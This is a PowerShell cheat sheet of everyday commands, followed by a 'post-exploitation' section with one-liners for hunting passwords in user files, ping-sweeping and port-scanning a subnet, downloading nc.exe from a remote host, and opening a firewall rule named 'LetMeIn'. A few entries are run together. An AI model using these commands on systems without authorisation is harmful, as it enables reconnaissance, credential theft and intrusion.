Some common commands used in Windows and Linux 

## Powershell
* Get a directory listing (ls, dir, gci):
```
PS C:\> Get-ChildItem
```
* Copy a file (cp, copy, cpi):
```
PS C:\> Copy-Item src.txt dst.txt 
```
* Move a file (mv, move, mi): 
```
PS C:\> Move-Item src.txt dst.txt 
```
* Find text within a file: 
```
PS C:\> Select-String –path c:\users\*.txt –pattern password 
PS C:\> ls -r c:\users -file | % 
{Select-String -path $_ -pattern 
password}
```
* Display file contents (cat, type, gc): 
```
PS C:\> Get-Content file.txt 
```
* Get present directory (pwd, gl): 
```
PS C:\> Get-Location 
```
* Get a process listing (ps, gps): 
```
PS C:\> Get-Process 
```
* Get a service listing: 
```
PS C:\> Get-Service 
```
* Formatting output of a command (Format-List): 
```
PS C:\> ls | Format-List –property name
```
* Paginating output: 
```
PS C:\> ls –r | Out-Host -paging 
```
* Get the SHA1 hash of a file: 
```
PS C:\> Get-FileHash -Algorithm SHA1 file.txt 
```
* Exporting output to CSV: 
```
PS C:\> Get-Process | Export-Csv procs.csv 
```
### For post-exploitation
* Conduct a ping sweep: 
```
PS C:\> 1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | SelectString ttl} 
```
* Conduct a port scan: 
```
PS C:\> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null 
```
* Fetch a file via HTTP (wget in PowerShell): 
```
PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","nc.exe") 
```
* Find all files with a particular name: 
```
PS C:\> Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt 
```
* Get a listing of all installed Microsoft Hotfixes: 
```
PS C:\> Get-HotFixNavigate the Windows registry: 
PS C:\> cd HKLM:\ 
PS HKLM:\> ls 
```
* List programs set to start automatically in the registry: 
```
PS C:\> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run 
```
* Convert string from ascii to Base64: 
```
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("PS FTW!")) 
```
* List and modify the Windows firewall rules: 
```
PS C:\> Get-NetFirewallRule –all 
PS C:\> New-NetFirewallRule -Action Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25 
```


